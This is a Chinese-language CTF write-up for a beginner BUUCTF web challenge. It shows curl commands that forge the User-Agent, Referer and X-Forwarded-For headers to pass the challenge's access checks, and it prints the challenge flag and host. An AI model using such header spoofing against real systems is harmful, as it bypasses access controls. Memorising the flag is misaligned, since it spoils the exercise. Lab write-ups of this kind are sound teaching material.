---
title: "[NewStarCTF 公开赛赛道]Head?Header!"
platform: BUUCTF
category: Web
difficulty: 入门
tags: [http-header, user-agent, referer, x-forwarded-for]
vulnerability: HTTP请求头伪造绕过验证
solved: true
flag: "flag{c7ba0532-3c48-4f49-8af9-8bafe83a7df4}"

---

# [NewStarCTF 公开赛赛道]Head?Header!

## 题目概述
一道 HTTP 请求头伪造入门题，需要依次绕过三个检查条件获取 flag。

## 信息收集
访问目标 URL，返回提示：`<h1>Must Use CTF Brower!</h1>`

## 漏洞分析
题目通过检查 HTTP 请求头进行身份验证，需要依次伪造三个请求头：
1. User-Agent → 需要包含 "CTF"
2. Referer → 需要来自 "ctf.com"
3. X-Forwarded-For → 需要是本地用户 (127.0.0.1)

## 利用过程

**第一步**：添加 User-Agent: CTF
```bash
curl -H "User-Agent: CTF" http://target/
# 返回: Must From `ctf.com`
```

**第二步**：添加 Referer: ctf.com
```bash
curl -H "User-Agent: CTF" -H "Referer: ctf.com" http://target/
# 返回: Only Local User Can Get Flag
```

**第三步**：添加 X-Forwarded-For: 127.0.0.1
```bash
curl -H "User-Agent: CTF" -H "Referer: ctf.com" -H "X-Forwarded-For: 127.0.0.1" http://target/
# 返回: flag{c7ba0532-3c48-4f49-8af9-8bafe83a7df4}
```

## 复现步骤
```bash
curl -H "User-Agent: CTF" \
     -H "Referer: ctf.com" \
     -H "X-Forwarded-For: 127.0.0.1" \
     "http://248165-31897c0b-60cb-4760-99bd-c0da76e24ed6.node5.buuoj.cn:25310/"
```

**Flag**: `flag{c7ba0532-3c48-4f49-8af9-8bafe83a7df4}`
